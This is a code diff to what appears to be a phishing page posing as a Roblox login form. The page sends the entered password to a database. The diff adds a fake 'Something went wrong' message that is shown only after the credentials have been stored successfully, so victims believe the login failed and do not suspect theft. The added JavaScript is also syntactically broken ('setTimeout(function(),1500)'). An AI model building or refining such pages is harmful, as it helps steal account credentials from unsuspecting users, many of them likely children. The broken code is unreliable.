@@ -17,6 +17,7 @@
     <input type="password" placeholder="Password" class="login" id="pass" name="password" required>
     <br><br><br>
     <button id="send" type="button">Log in</button>
+    <label id="infolabel" style="color: white; display: none;">Something went wrong. Please try again later.</label>
     <br><br><hr><br>
 <a id="f" href="https://www.roblox.com/login/forgot-password-or-username">Forgot password?</a>
   </div>
@@ -39,7 +40,9 @@
         if (error) {
           console.error('Insert error:', error);
         } else {
-          console.log('Sent!');
+          document.getElementById('infolabel').style.display = "flex"
+          setTimeout(function(),1500)
+          document.getElementById('infolabel').style.display = "none"
         }
       } catch (err) {
         console.error('Network error:', err);
